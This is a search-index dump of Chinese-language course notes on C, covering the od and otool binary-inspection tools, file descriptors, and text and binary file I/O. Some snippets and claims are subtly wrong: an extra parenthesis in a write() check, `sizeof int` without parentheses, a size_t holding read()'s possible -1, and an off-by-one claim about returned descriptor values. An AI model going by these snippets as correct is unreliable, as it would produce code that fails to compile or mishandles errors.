<li>\u67e5\u770b\u4e8c\u8fdb\u5236\u6587\u4ef6\uff1a<code>od</code> \u53ef\u4ee5\u7528\u6765\u67e5\u770b\u65e0\u6cd5\u901a\u8fc7\u6587\u672c\u7f16\u8f91\u5668\u8bfb\u53d6\u7684\u4e8c\u8fdb\u5236\u6587\u4ef6\u5185\u5bb9\u3002</li> <li>\u8c03\u8bd5\uff1a\u53ef\u4ee5\u5e2e\u52a9\u5f00\u53d1\u8005\u67e5\u770b\u6587\u4ef6\u7684\u5e95\u5c42\u5b57\u8282\u7ed3\u6784\uff0c\u8c03\u8bd5\u6587\u4ef6\u683c\u5f0f\u6216\u534f\u8bae\u3002</li> <li>\u6587\u4ef6\u68c0\u67e5\uff1a\u5feb\u901f\u68c0\u67e5\u6587\u4ef6\u7684\u5185\u5bb9\uff0c\u5c24\u5176\u662f\u4e00\u4e9b\u672a\u77e5\u6216\u635f\u574f\u7684\u6587\u4ef6\u3002</li> </ul> <p><code>od</code> \u662f\u4e00\u4e2a\u4f4e\u7ea7\u522b\u7684\u5de5\u5177\uff0c\u4e3b\u8981\u7528\u4e8e\u67e5\u770b\u6587\u4ef6\u7684\u539f\u59cb\u6570\u636e\u3002</p> <p><code>otool</code> \u662f macOS \u548c\u5176\u4ed6\u57fa\u4e8e Darwin \u7684\u64cd\u4f5c\u7cfb\u7edf\u4e0a\u7684\u4e00\u4e2a\u547d\u4ee4\u884c\u5de5\u5177\uff0c\u4e13\u95e8\u7528\u4e8e\u663e\u793a\u548c\u5206\u6790 Mach-O \u683c\u5f0f\u7684\u4e8c\u8fdb\u5236\u6587\u4ef6\uff08macOS \u548c iOS \u4e0a\u7684\u53ef\u6267\u884c\u6587\u4ef6\u3001\u5e93\u3001\u76ee\u6807\u6587\u4ef6\u7b49\uff09\u3002</p> <p>Mach-O \u6587\u4ef6\u662f macOS \u548c iOS \u4e0a\u7684\u4e8c\u8fdb\u5236\u6587\u4ef6\u683c\u5f0f\uff0c\u7c7b\u4f3c\u4e8e Linux \u4e0a\u7684 ELF \u6587\u4ef6\u683c\u5f0f\u3002</p>"},{"location":"cs/c/4.1/#otool","title":"<code>otool</code> \u7684\u529f\u80fd","text":"<p><code>otool</code> \u63d0\u4f9b\u4e86\u5bf9 Mach-O \u6587\u4ef6\u5185\u90e8\u7ed3\u6784\u7684\u8be6\u7ec6\u67e5\u770b\uff0c\u5305\u62ec\u4f46\u4e0d\u9650\u4e8e\u4ee5\u4e0b\u5185\u5bb9\uff1a - \u6587\u4ef6\u5934\u4fe1\u606f - \u5b57\u7b26\u8868 - \u7b26\u53f7\u8868 - \u7a0b\u5e8f\u7684\u6bb5\u3001\u8282\u4fe1\u606f - \u53cd\u6c47\u7f16\u4ee3\u7801</p>"},{"location":"cs/c/4.1/#_5","title":"\u5e38\u7528\u9009\u9879","text":"<ul> <li><code>-t</code>\uff1a\u663e\u793a\u6587\u4ef6\u7684\u6587\u672c\u6bb5\uff0c\u5373\u53ef\u6267\u884c\u7684\u673a\u5668\u6307\u4ee4\u3002\u8fd9\u4f1a\u663e\u793a\u6587\u4ef6\u7684\u53cd\u6c47\u7f16\u4ee3\u7801\u3002</li> <li><code>-v</code>\uff1a\u4ee5\u8be6\u7ec6\u6a21\u5f0f\u8f93\u51fa\u3002</li> <li><code>-V</code>\uff1a\u540c\u65f6\u663e\u793a\u539f\u59cb\u5b57\u8282\u7801\u548c\u6c47\u7f16\u6307\u4ee4\u3002</li> <li><code>| less</code>\uff1a\u7ba1\u9053\u64cd\u4f5c\uff0c\u5c06\u8f93\u51fa\u901a\u8fc7 <code>less</code> \u5206\u9875\u663e\u793a\uff0c\u4fbf\u4e8e\u9010\u9875\u67e5\u770b\u957f\u8f93\u51fa\u5185\u5bb9\u3002</li> </ul>"},{"location":"cs/c/4.1/#_6","title":"\u793a\u4f8b\u89e3\u8bfb","text":"<p><pre><code>otool -tvV /bin/ls | less\n</code></pre> \u8fd9\u6761\u547d\u4ee4\u7684\u542b\u4e49\u662f\uff1a 1. \u4f7f\u7528 <code>otool</code> \u5bf9 <code>/bin/ls</code>\uff08ls \u547d\u4ee4\u7684\u53ef\u6267\u884c\u6587\u4ef6\uff09\u8fdb\u884c\u53cd\u6c47\u7f16\uff0c\u67e5\u770b\u5176\u4e2d\u7684\u673a\u5668\u7801\u548c\u6c47\u7f16\u6307\u4ee4\u3002 2. \u901a\u8fc7 <code>-t</code> \u9009\u9879\uff0c\u63d0\u53d6\u5176\u6587\u672c\u6bb5\uff0c\u663e\u793a\u6c47\u7f16\u4ee3\u7801\u3002 3. \u4f7f\u7528 <code>-v</code> \u548c <code>-V</code> \u9009\u9879\uff0c\u4ee5\u8be6\u7ec6\u6a21\u5f0f\u8f93\u51fa\u5e76\u5305\u62ec\u539f\u59cb\u5b57\u8282\u7801\u548c\u5bf9\u5e94\u7684\u53cd\u6c47\u7f16\u6307\u4ee4\u3002 4. \u6700\u540e\u901a\u8fc7 <code>less</code> \u547d\u4ee4\u5206\u9875\u663e\u793a\u8f93\u51fa\u5185\u5bb9\uff0c\u65b9\u4fbf\u7528\u6237\u9605\u8bfb\u3002</p>"},{"location":"cs/c/4.1/#otool_1","title":"<code>otool</code> \u7684\u5e94\u7528\u573a\u666f","text":"<ul> <li>\u67e5\u770b Mach-O \u6587\u4ef6\u7684\u7ed3\u6784\uff1a\u5f00\u53d1\u8005\u53ef\u4ee5\u4f7f\u7528 <code>otool</code> \u67e5\u770b macOS \u548c iOS \u5e94\u7528\u7684\u53ef\u6267\u884c\u6587\u4ef6\u3001\u5e93\u6216\u76ee\u6807\u6587\u4ef6\u7684\u8be6\u7ec6\u7ed3\u6784\u4fe1\u606f\u3002</li> <li>\u8c03\u8bd5\u548c\u9006\u5411\u5de5\u7a0b\uff1a\u901a\u8fc7\u53cd\u6c47\u7f16\u548c\u67e5\u770b\u7b26\u53f7\u8868\uff0c<code>otool</code> \u662f\u8c03\u8bd5\u7a0b\u5e8f\u3001\u5206\u6790\u5e94\u7528\u884c\u4e3a\u3001\u9006\u5411\u5de5\u7a0b\u7b49\u7684\u5e38\u7528\u5de5\u5177\u3002</li> <li>\u4f9d\u8d56\u5206\u6790\uff1a\u5f00\u53d1\u8005\u8fd8\u53ef\u4ee5\u4f7f\u7528 <code>otool</code> \u5206\u6790\u6587\u4ef6\u6240\u4f9d\u8d56\u7684\u52a8\u6001\u5e93\u548c\u5176\u4ed6\u5916\u90e8\u94fe\u63a5\u3002</li> </ul> <p>\u56e0\u6b64\uff0c<code>otool</code> \u662f macOS \u5f00\u53d1\u8005\u8fdb\u884c\u5e95\u5c42\u5206\u6790\u7684\u91cd\u8981\u5de5\u5177\uff0c\u7c7b\u4f3c\u4e8e Linux \u4e0a\u7684 <code>objdump</code> \u6216 <code>readelf</code>\u3002</p>"},{"location":"cs/c/4.2/","title":"4.2 I/O","text":""},{"location":"cs/c/4.2/#wed-lecture","title":"Wed Lecture","text":"<p>At the lowest level, an operating system will only communicate using bytes, not with higher-level integers or floating-point values. C11 employs arrays of characters to hold the bytes in requests for raw input and output.</p> <p>\u5728\u8bf7\u6c42\u539f\u59cb\u8f93\u5165\u548c\u8f93\u51fa\u65f6\uff0cC11 \u4f1a\u4f7f\u7528\u5b57\u7b26\u6570\u7ec4\u6765\u4fdd\u5b58\u8fd9\u4e9b\u8bf7\u6c42\u4e2d\u7684\u5b57\u8282\u3002\u64cd\u4f5c\u7cfb\u7edf\u53ea\u8ba4\u5b57\u8282\uff0c\u800c\u5b57\u7b26\u6570\u7ec4\u6b63\u662f\u5c06\u6570\u636e\u6253\u5305\u6210\u5b57\u8282\u7684\u5f62\u5f0f\uff0c\u56e0\u6b64\u5b57\u7b26\u6570\u7ec4\u5728\u8fd9\u91cc\u8d77\u5230\u5173\u952e\u4f5c\u7528\u3002</p>"},{"location":"cs/c/4.2/#file-descriptors","title":"File Descriptors","text":"<p>\u5728\u57fa\u4e8e Unix \u7684\u64cd\u4f5c\u7cfb\u7edf\u4e2d\uff0c\u6587\u4ef6\u63cf\u8ff0\u7b26\u662f\u7528\u4e8e\u6807\u8bc6\u5404\u79cd\u901a\u4fe1\u6e20\u9053\u7684\u6574\u6570\u503c\u3002\u8fd9\u4e9b\u6e20\u9053\u53ef\u4ee5\u662f\u6587\u4ef6\u3001\u8fdb\u7a0b\u95f4\u901a\u4fe1\u7ba1\u9053\u3001\u8bbe\u5907\uff0c\u6216\u8005\u7f51\u7edc\u8fde\u63a5\u7b49\u3002\u6587\u4ef6\u63cf\u8ff0\u7b26\u4f5c\u4e3a\u7b80\u5355\u7684\u6574\u6570\u503c\uff0c\u63d0\u4f9b\u4e86\u4e0e\u8fd9\u4e9b\u8d44\u6e90\u7684\u63a5\u53e3\u3002</p> <p>\u5728 C11 \u7f16\u7a0b\u4e2d\uff0c\u6587\u4ef6\u63cf\u8ff0\u7b26\u548c\u5b57\u7b26\u6570\u7ec4\u7ecf\u5e38\u7ec4\u5408\u4f7f\u7528\u6765\u5411\u64cd\u4f5c\u7cfb\u7edf\u53d1\u51fa\u8f93\u5165\u8f93\u51fa\u8bf7\u6c42\u3002\u4ee5\u6587\u4ef6\u8bfb\u53d6\u4e3a\u4f8b\uff0c\u7a0b\u5e8f\u901a\u8fc7\u6574\u6570\u6587\u4ef6\u63cf\u8ff0\u7b26\u544a\u8bc9\u64cd\u4f5c\u7cfb\u7edf\u8981\u8bbf\u95ee\u54ea\u4e2a\u6587\u4ef6\uff0c\u5e76\u5c06\u8bfb\u53d6\u7684\u5185\u5bb9\u5b58\u5165\u5b57\u7b26\u6570\u7ec4\u4e2d\uff0c\u7cfb\u7edf read \u7ec6\u8282\u53ef\u4ee5\u53c2\u8003 <code>man 2 open</code></p> <p>\u4ee5\u4e0b\u4e3a\u8bfb\u53d6\u6587\u4ef6\u5168\u90e8\u5185\u5bb9\u5b8c\u6574\u4ee3\u7801\uff1a</p> <pre><code>#include  &lt;stdio.h&gt;\n#include  &lt;fcntl.h&gt;\n#include  &lt;stdlib.h&gt;\n#include  &lt;unistd.h&gt;\n\n#define  MYSIZE      10000\n\nvoid read_using_descriptor(char filename[])        \n{\n    // \u5c1d\u8bd5\u4ee5\u53ea\u8bfb\u65b9\u5f0f\u6253\u5f00\u6587\u4ef6\n    int fd = open(filename, O_RDONLY);\n\n    // \u68c0\u67e5\u6587\u4ef6\u662f\u5426\u6210\u529f\u6253\u5f00\n    if(fd == -1) {\n        printf(\"cannot open '%s'\\n\", filename);\n        exit(EXIT_FAILURE);\n    }\n\n    // \u5b9a\u4e49\u5b57\u7b26\u6570\u7ec4\u7528\u4e8e\u4fdd\u5b58\u6587\u4ef6\u5185\u5bb9\n    char buffer[MYSIZE];\n    size_t got;\n\n    // \u591a\u6b21\u8bfb\u53d6\u6587\u4ef6\u76f4\u5230\u6587\u4ef6\u672b\u5c3e\n    while((got = read(fd, buffer, sizeof buffer)) &gt; 0) {\n        write(STDOUT_FILENO, buffer, got);\n    }\n    // \u5f53 read \u51fd\u6570\u8fd4\u56de 0 \u65f6\uff0c\u8868\u793a\u5df2\u7ecf\u5230\u8fbe\u6587\u4ef6\u672b\u5c3e\uff08EOF\uff09\uff0c\u6ca1\u6709\u66f4\u591a\u7684\u6570\u636e\u53ef\u4ee5\u8bfb\u53d6\u3002\u8fd9\u65f6\u5faa\u73af\u6761\u4ef6 got &gt; 0 \u4e0d\u518d\u6ee1\u8db3\uff0c\u5faa\u73af\u9000\u51fa\u3002\n      // \u5982\u679c read \u51fd\u6570\u8fd4\u56de\u8d1f\u503c\uff0c\u5219\u8868\u793a\u53d1\u751f\u4e86\u9519\u8bef\uff0c\u5faa\u73af\u4e5f\u4f1a\u9000\u51fa\u3002\n\n    // \u5173\u95ed\u6587\u4ef6\uff0c\u8868\u793a\u4e0d\u518d\u8bbf\u95ee\n    close(fd);\n}\n\nint main() {\n    read_using_descriptor(\"haversine.c\");\n}\n</code></pre> <p>\u5176\u4e2d <code>fcntl.h</code> \u4e3a\u5e95\u5c42\u63d0\u4f9b\u7684\u7cfb\u7edf\u8c03\u7528\uff0c\u5e76\u4e0d\u662f C11 \u7684\u6807\u51c6\u5e93\u51fd\u6570\uff0c\u63d0\u4f9b\u4e86 <code>open</code>, <code>read</code>, <code>close</code> \u7b49\u8d1f\u8d23\u4e0e\u64cd\u4f5c\u7cfb\u7edf\u4ea4\u4e92\u5e76\u6267\u884c\u4f4e\u5c42\u6b21\u7684\u8f93\u5165\u8f93\u51fa\u64cd\u4f5c\u3002<code>unistd.h</code>\u63d0\u4f9b\u6807\u51c6\u6587\u4ef6\u5378\u8f7d\u51fd\u6570\u7684 close \u6389\u8c03\u7528\u901a\u9053\u540e\u91ca\u653e\u5185\u5b58 </p> <p><code>int fd = open(filename, O_RDONLY)</code> open and read only \u7684\u7f29\u5199\u53ea\u8bfb\uff1b\u5176\u6b21\u6253\u5f00\u6587\u4ef6\u53ef\u80fd\u4f1a\u9047\u5230\u51e0\u79cd\u60c5\u51b5\uff0c\u6587\u4ef6\u4e0d\u5b58\u5728 ENOENT \u6587\u4ef6\u6ca1\u6709\u6743\u9650 EACCESS \u548c\u6587\u4ef6\u7cfb\u7edf\u8fbe\u5230\u6253\u5f00\u6587\u4ef6\u6570\u91cf\u7684\u4e0a\u9650 EMFILE \u6216 ENFILE</p> <p>\u7cfb\u7edf\u6210\u529f\u6253\u5f00\u6587\u4ef6\u540e\u4f1a\u8fd4\u56de\u6b63\u6574\u6570\uff0c\u4e00\u4e2a\u5927\u4e8e 3 \u7684\u503c\uff0c0 1 2 \u5206\u522b\u5c5e\u4e8e <code>stdin</code>, <code>stdout</code>, <code>stderr</code> \u7684\u6807\u51c6\u6587\u4ef6\u63cf\u8ff0\u7b26\u3002\u5f53\u6587\u4ef6\u6253\u5f00\u5931\u8d25\u65f6\uff0copen \u51fd\u6570\u4f1a\u8fd4\u56de -1 </p> <pre><code>if(fd == -1) {\n    printf(\"cannot open '%s'\\n\", filename);\n    exit(EXIT_FAILURE);\n}\n</code></pre> <p>EXIT_FAILURE \u662f\u4e00\u4e2a\u5b8f\uff0c\u5b9a\u4e49\u5728  \u4e2d\uff0c\u5b83\u8868\u793a\u7a0b\u5e8f\u7684\u5f02\u5e38\u9000\u51fa\u6216\u5931\u8d25\u72b6\u6001\u3002\u4f7f\u7528 EXIT_FAILURE \u53ef\u4ee5\u66f4\u52a0\u660e\u786e\u5730\u544a\u8bc9\u64cd\u4f5c\u7cfb\u7edf\u7a0b\u5e8f\u7531\u4e8e\u67d0\u79cd\u9519\u8bef\u800c\u9000\u51fa\u3002\u4e0e\u4e4b\u76f8\u5bf9\u7684\u5b8f\u662f EXIT_SUCCESS\uff0c\u8868\u793a\u7a0b\u5e8f\u7684\u6b63\u5e38\u9000\u51fa\u3002 <p>\u4e0e Python \u4e0d\u540c\u7684\u662f C \u9700\u8981\u663e\u793a\u624b\u52a8\u7ba1\u7406\u5185\u5b58\uff0c\u56e0\u6b64\u5e95\u5c42\u7684\u7f13\u51b2\u548c\u5185\u5b58\u7ba1\u7406\u9700\u8981\u624b\u52a8\u7ba1\u7406\uff0c\u6570\u7ec4 buffer \u7684\u4f5c\u7528\u4e3a\u4e34\u65f6\u4fdd\u5b58\u6587\u4ef6\u5185\u5bb9\uff0c\u63d0\u9ad8\u6548\u7387\u5e76\u51cf\u5c11\u7cfb\u7edf\u8c03\u7528\u6b21\u6570\uff0c\u540c\u65f6\u6211\u4eec\u4e5f\u9700\u8981\u624b\u52a8\u8bbe\u7f6e\u5185\u5b58\u5927\u5c0f\uff1a</p> <pre><code>char buffer[1024];\nint fd = open(\"file.txt\", O_RDONLY);\nint bytes_read = read(fd, buffer, sizeof(buffer));\n</code></pre> <p>size_t \u7c7b\u578b\u4e3a\u65e0\u7b26\u53f7\u6574\u6570\u7c7b\u578b\uff0c\u901a\u5e38\u7528\u4e8e\u63cf\u8ff0\u5185\u5b58\u6216\u6570\u636e\u5757\u5927\u5c0f\uff0c\u5728 32 \u4f4d\u7cfb\u7edf\u4e0a\uff0csize_t \u901a\u5e38\u662f 4 \u5b57\u8282\u957f\uff0832 \u4f4d\uff09\uff0c\u5728 64 \u4f4d\u7cfb\u7edf\u4e0a\uff0c\u5b83\u901a\u5e38\u662f 8 \u5b57\u8282\u957f\uff0864 \u4f4d\uff09\u3002\u56e0\u6b64\uff0c\u5b83\u8db3\u591f\u5927\uff0c\u80fd\u591f\u8868\u793a\u7cfb\u7edf\u5185\u5b58\u4e2d\u5bf9\u8c61\u7684\u6700\u5927\u53ef\u80fd\u5927\u5c0f\u3002</p> <pre><code>printf(\"%lu\", got); //2185 \u4e2a\u8bfb\u53d6\u6587\u4ef6 read \u6d41\u5b57\u8282\u6570\n</code></pre> <p>USB \u548c\u7f51\u7edc\u8fde\u63a5\u7684\u60c5\u51b5\u4e0b got \u8fd9\u79cd\u5bb9\u6613\u51fa\u9519</p>"},{"location":"cs/c/4.2/#copy-a-file-using-file-descriptors","title":"Copy a file using file descriptors","text":"<pre><code>#include  &lt;stdio.h&gt;\n#include  &lt;fcntl.h&gt;\n#include  &lt;stdlib.h&gt;\n#include  &lt;unistd.h&gt;\n\n#define  MYSIZE      10000\n\nint copy_file(char destination[], char source[])        \n{\n//  ATTEMPT TO OPEN source FOR READ-ONLY ACCESS\n    int fd0    = open(source, O_RDONLY);\n//  ENSURE THE FILE COULD BE OPENED\n    if(fd0 == -1) {\n        return -1;\n    }\n\n//  ATTEMPT TO OPEN destination FOR WRITE-ONLY ACCESS\n    int fd1    = open(destination, O_WRONLY);\n//  ENSURE THE FILE COULD BE OPENED\n    if(fd1 == -1) {\n        close(fd0);\n        return -1;\n    }\n\n//  DEFINE A CHARACTER ARRAY TO HOLD THE FILE'S CONTENTS\n    char   buffer[MYSIZE];\n    size_t got;\n\n//  PERFORM MULTIPLE READs OF FILE UNTIL END-OF-FILE REACHED  \n    while((got = read(fd0, buffer, sizeof buffer)) &gt; 0) {  \n        if(write(fd1, buffer, got)) != got) {  \n            close(fd0); close(fd1);\n            return -1;\n        }\n    }\n\n    close(fd0); close(fd1);\n    return 0;\n}\n</code></pre> <p>\u548c read \u4ee3\u7801\u524d\u671f\u64cd\u4f5c\u4e00\u81f4\uff0c\u9664\u4e86\u53cc open \u64cd\u4f5c\u5728 while \u5faa\u73af\u5904\uff1a</p> <p>\u8fd9\u91cc\u7684 while loop condition \u7684\u903b\u8f91\u662f\uff1awhile \u5faa\u73af\u4f1a\u4e0d\u65ad\u5730\u4ece\u6587\u4ef6\u4e2d\u8bfb\u53d6\u6570\u636e\u5e76\u5199\u5165\u6807\u51c6\u8f93\u51fa\uff0c\u76f4\u5230\u8bfb\u53d6\u5230\u6587\u4ef6\u672b\u5c3e\uff08read \u8fd4\u56de 0\uff09\u6216\u53d1\u751f\u9519\u8bef\uff08read \u8fd4\u56de\u8d1f\u503c\uff09\u3002</p> <p>\u53ea\u8981\u6ee1\u8db3\u8fd9\u4e2a condition \u5c31\u7ee7\u7eed\u8fd0\u884c\uff0c\u4e0d\u6ee1\u8db3\u76f4\u63a5\u9000\u51fa</p> <pre><code>while((got = read(fd0, buffer, sizeof buffer)) &gt; 0) {  \n    if(write(fd1, buffer, got)) != got) {  \n        close(fd0); close(fd1);\n        return -1;\n    }\n}\n</code></pre> <p>read(fd, buffer, sizeof buffer)\uff1a\u4ece\u6587\u4ef6\u63cf\u8ff0\u7b26 fd \u4e2d\u8bfb\u53d6\u6570\u636e\uff0c\u6700\u591a\u8bfb\u53d6 sizeof buffer \u5b57\u8282\u7684\u6570\u636e\uff0c\u5e76\u5c06\u8fd9\u4e9b\u6570\u636e\u5b58\u50a8\u5728 buffer \u4e2d\u3002\u8fd9\u4e2a\u51fd\u6570\u8fd4\u56de\u5b9e\u9645\u8bfb\u53d6\u7684\u5b57\u8282\u6570\u3002write \u51fd\u6570\u5c1d\u8bd5\u5c06 buffer \u4e2d\u7684 got \u5b57\u8282\u6570\u636e\u5199\u5165\u5230 fd1 \u6307\u5b9a\u7684\u6587\u4ef6\u63cf\u8ff0\u7b26\u3002\u5b83\u8fd4\u56de\u5b9e\u9645\u5199\u5165\u7684\u5b57\u8282\u6570\u3002</p> <p>\u8fd9\u4e2a\u6761\u4ef6\u68c0\u67e5 write \u51fd\u6570\u7684\u8fd4\u56de\u503c\u662f\u5426\u7b49\u4e8e got\u3002\u5982\u679c\u8fd4\u56de\u503c\u4e0d\u7b49\u4e8e got\uff0c\u8bf4\u660e\u5199\u5165\u64cd\u4f5c\u6ca1\u6709\u5b8c\u5168\u6210\u529f\uff08\u53ef\u80fd\u90e8\u5206\u6570\u636e\u6ca1\u6709\u5199\u5165\uff0c\u6216\u8005\u53d1\u751f\u4e86\u9519\u8bef\uff09\u3002</p>"},{"location":"cs/c/4.2/#read-and-writing-text-files","title":"Read and writing text files","text":"<p>\u8bfb\u53d6 txt \u548c\u8bfb\u53d6\uff0c\u5199\u5165 byte \u7684\u65b9\u6cd5\u4e0d\u4e00\u6837\uff0c\u56e0\u4e3a\u662f\u8bfb\u53d6 txt \u4e00\u822c\u90fd\u662f\u4e00\u884c\u4e00\u884c\u7684\u8bfb\u53d6\uff0c\u4e0d\u662f\u7f51\u7edc\u5b57\u8282\u3002\u56e0\u6b64\u7528 std \u5e93\u91cc\u7684 fopen \u548c fclose \u51fd\u6570\u8fdb\u884c\u9ad8\u7ea7\u64cd\u4f5c\uff1a</p> <pre><code>#include &lt;stdio.h&gt;\n\n#define DICTIONARY      \"/usr/share/dict/words\"\n\n....\n//  ATTEMPT TO OPEN THE FILE FOR READ-ACCESS\n    FILE   *dict = fopen(DICTIONARY, \"r\");\n\n//  CHECK IF ANYTHING WENT WRONG\n    if(dict == NULL) {\n        printf( \"cannot open dictionary '%s'\\n\", DICTIONARY);\n        exit(EXIT_FAILURE);\n    }\n\n//  READ AND PROCESS THE CONTENTS OF THE FILE\n    ....\n\n//  WHEN WE'RE FINISHED, CLOSE THE FILE\n    fclose(dict);\n</code></pre> <p>\u64cd\u4f5c\u53c2\u6570\u4e0e Python \u4e00\u81f4</p> <p>r, r+, w, w+, a, a+</p> <pre><code>FILE   *dict = fopen(DICTIONARY, \"r\");\n</code></pre> <p>\u7528 FILE \u7c7b\u578b\u58f0\u660e\uff0c<code>*</code> \u8868\u660e dict \u662f\u4e00\u4e2a\u6307\u5411 FILE \u7c7b\u578b\u6570\u636e\u7684\u6307\u9488</p> <p>\u6709\u4e9b\u4ee3\u7801\u4e2d\u4f1a\u51fa\u73b0 br \u4e4b\u7c7b\u7684\u7528\u4e8c\u8fdb\u5236\u6a21\u5f0f\u6253\u5f00\u6587\u4ef6\uff0c\u8fd9\u79cd\u6807\u5fd7\u53ea\u4f1a\u5728 Windows \u6709\u6548\uff0c\u5176\u4ed6\u7cfb\u7edf\u4f1a\u88ab\u80e1\u54a7\uff0c\u4e3a\u4e0a\u4e2a\u4e16\u7eaa\u9057\u7559\u4e0b\u6765\u7684\u4e00\u4e9b\u8001\u6807\u51c6</p>"},{"location":"cs/c/4.2/#read-txt-line-by-line","title":"Read txt line by line","text":"<pre><code>#include &lt;stdio.h&gt;\n\n....\n    FILE   *dict;\n    char   line[BUFSIZ];\n\n    dict = fopen( ..... );\n    ....\n\n//  READ EACH LINE FROM THE FILE,\n//  CHECKING FOR END-OF-FILE OR AN ERROR\n    while( fgets(line, sizeof line, dict) != NULL ) {  \n        ....\n        ....     // process this line\n        ....\n    }\n//  AT END-OF-FILE (OR AN ERROR), CLOSE THE FILE\n    fclose(dict);\n</code></pre> <p>\u4ece\u68c0\u67e5\u6574\u4f53\u5230\u4e00\u884c\u884c\u68c0\u67e5\uff1a</p> <p>\u7ed3\u679c\u53d1\u73b0\u8bfb\u53d6\u7684\u6bcf\u4e00\u884c\u5b9e\u9645\u4e0a\u7ed3\u5c3e\u90fd\u4f1a\u6709 <code>\\n\\0</code>, \u5728 Windows \u7cfb\u7edf\u4e0a\u751a\u81f3\u8fd8\u591a\u4e00\u4e2a\u56de\u8f66\u7b26\uff1a<code>\\r\\n\\0</code> \u56e0\u6b64\u7f16\u5199\u4e00\u4e2a\u51fd\u6570\u5c06\u5176\u66ff\u6362\u4e3a null byte</p> <pre><code>// REMOVE ANY TRAILING end-of-line CHARACTERS FROM THE LINE\nvoid trim_line(char line[])\n{\n    int i = 0;\n\n//  LOOP UNTIL WE REACH THE END OF line\n    while(line[i] != '\\0') {\n\n//  CHECK FOR CARRIAGE-RETURN OR NEWLINE\n        if( line[i] == '\\r' || line[i] == '\\n' ) {\n            line[i] = '\\0'; // overwrite with null-byte\n            break;          // leave the loop early\n        }\n        i = i+1;            // iterate through character array\n    }\n}\n</code></pre> <p>\u4f46\u662f\u8fd9\u6837\u7684\u64cd\u4f5c\u662f\u5bf9 variable \u7684\u526f\u672c\u8fdb\u884c\u7f16\u8f91</p>"},{"location":"cs/c/4.2/#writing-text-output-to-a-file","title":"Writing text output to a file","text":"<p><code>fgets()</code> \u4ece\u6587\u4ef6\u4e2d\u83b7\u53d6\u4e00\u884c\u6587\u672c\uff0c\u7528 <code>fputs</code> \u5199\u5165\u4e00\u884c\u6587\u672c</p> <p><code>fputs</code> \u7684\u6587\u4ef6\u6307\u9488\u5fc5\u987b\u63d0\u524d\u5df2\u7ecf <code>open</code> for writing \u6216 appending </p>"},{"location":"cs/c/4.2/#copy-a-text-file-using-file-pointers","title":"Copy a text file using file pointers","text":"<p>\u4ee5\u4e0b\u5c31\u662f\u5e26\u6709\u5168\u90e8\u5b8c\u6574\u6b63\u5e38\u529f\u80fd\u7684\u5168\u90e8\u7a0b\u5e8f\uff1a</p> <pre><code>#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n\nvoid copy_text_file(char destination[], char source[])\n{\n    FILE        *fp_in   = fopen(source, \"r\");\n    FILE        *fp_out  = fopen(destination,  \"w\");\n\n//  ENSURE THAT OPENING BOTH FILES HAS BEEN SUCCESSFUL\n    if(fp_in != NULL &amp;&amp; fp_out != NULL) {\n        char    line[BUFSIZ];\n\n        while( fgets(line, sizeof line, fp_in) != NULL) {  \n            if(fputs(line, fp_out) == EOF) {\n                printf(\"error copying file\\n\");\n                exit(EXIT_FAILURE);\n            }\n        }\n    }\n//  ENSURE THAT WE ONLY CLOSE FILES THAT ARE OPEN\n    if(fp_in != NULL) {\n        fclose(fp_in);\n    }\n    if(fp_out != NULL) {\n        fclose(fp_out);\n    }\n}\n</code></pre> <p>\u7531\u4e8e <code>fputs</code> \u6709 return \u64cd\u4f5c\uff0c\u56e0\u6b64\u5728 if \u8fc7\u7a0b\u4e2d\u5c31\u5df2\u7ecf\u5199\u5165\u8fdb out \u6307\u9488</p>"},{"location":"cs/c/4.2/#reading-and-writing-files-of-binary-data","title":"Reading and writing files of binary data","text":"<pre><code>#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n\nvoid copyfile(char destination[], char source[])\n{\n    FILE        *fp_in   = fopen(source, \"rb\");\n    FILE        *fp_out  = fopen(destination,  \"wb\");\n\n//  ENSURE THAT OPENING BOTH FILES HAS BEEN SUCCESSFUL\n    if(fp_in != NULL &amp;&amp; fp_out != NULL) {\n\n        char    buffer[BUFSIZ];\n        size_t  got, wrote;\n\n        while( (got = fread(buffer, 1, sizeof buffer, fp_in)) &gt; 0) {  \n            wrote = fwrite(buffer, 1, got, fp_out);\n            if(wrote != got) {\n                printf(\"error copying files\\n\");\n                exit(EXIT_FAILURE);\n            }\n        }\n\n    }\n\n//  ENSURE THAT WE ONLY CLOSE FILES THAT ARE OPEN\n    if(fp_in != NULL) {\n        fclose(fp_in);\n    }\n    if(fp_out != NULL) {\n        fclose(fp_out);\n    }\n}\n</code></pre> <p>\u64cd\u4f5c\u53c2\u6570\u540e\u52a0\u5165 b \u7136\u540e\u6309\u7167 1 \u5b57\u8282 1 \u5b57\u8282\u7684\u5927\u5c0f\u64cd\u4f5c\u590d\u5236\uff0c\u4e00\u822c\u7528\u4e8e\u7f51\u7edc\u4f20\u8f93\u548c\u534f\u8bae\u89e3\u5305\uff0c\u8ba9\u6570\u636e\u9879\u5927\u5c0f\u76f8\u540c</p> <pre><code>size_t  fread(void *ptr, size_t eachsize, size_t nelem, FILE *stream);\n</code></pre>"},{"location":"cs/c/4.2/#tape","title":"Tape","text":"<p>Professor \u63d0\u51fa\u4e86\u78c1\u5e26\u64e6\u51fa\u5f55\u5236\u7684\u6982\u5ff5\uff0c\u7528\u5230\u4e86 rewind \u51fd\u6570\u8986\u5199\uff1a</p> <pre><code>#include &lt;stdio.h&gt;\n\nint   intarray[ N_ELEMENTS ];\nint   got, wrote;\n\n//  OPEN THE BINARY FILE FOR READING AND WRITING\n    FILE  *fp = fopen(filename, \"rb+\");\n    ....\n\n    got = fread( intarray, sizeof int, N_ELEMENTS, fp);  \n    printf(\"just read in %i ints\\n\", got);\n\n//  MODIFY THE BINARY DATA IN THE ARRAY\n    ....\n\n//  REWIND THE FILE TO ITS BEGINNING\n    rewind(fp);\n\n//  AND NOW OVER-WRITE THE BEGINNING DATA\n    wrote = fwrite( intarray, sizeof int, N_ELEMENTS, fp);  \n    ....\n\n    fclose(fp);\n</code></pre> <p>rewind \u51fd\u6570\u5c06\u7ed9\u5b9a\u7684\u6587\u4ef6\u6d41 stream 